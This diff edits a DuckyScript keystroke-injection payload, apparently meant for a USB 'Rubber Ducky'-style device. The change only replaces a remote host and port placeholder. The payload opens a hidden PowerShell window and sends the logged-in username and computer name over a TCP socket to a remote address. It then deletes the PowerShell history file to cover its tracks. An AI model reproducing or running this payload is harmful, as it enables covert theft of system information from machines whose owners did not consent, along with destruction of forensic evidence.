@@ -4,7 +4,7 @@ DELAY 250
 STRING powershell -Windowstyle Hidden
 ENTER
 DELAY 300
-STRING $data=[System.Text.Encoding]::ASCII.GetBytes("Username:$env:username---Computer:$env:computername");(new-object System.Net.Sockets.TcpClient('<RemoteIp>',6666)).GetStream().Write($data,0,$data.Length);
+STRING $data=[System.Text.Encoding]::ASCII.GetBytes("Username:$env:username---Computer:$env:computername");(new-object System.Net.Sockets.TcpClient('RemoteIPAddress',<port>)).GetStream().Write($data,0,$data.Length);
 ENTER
 DELAY 300
 STRING Remove-Item (Get-PSReadlineOption).HistorySavePath
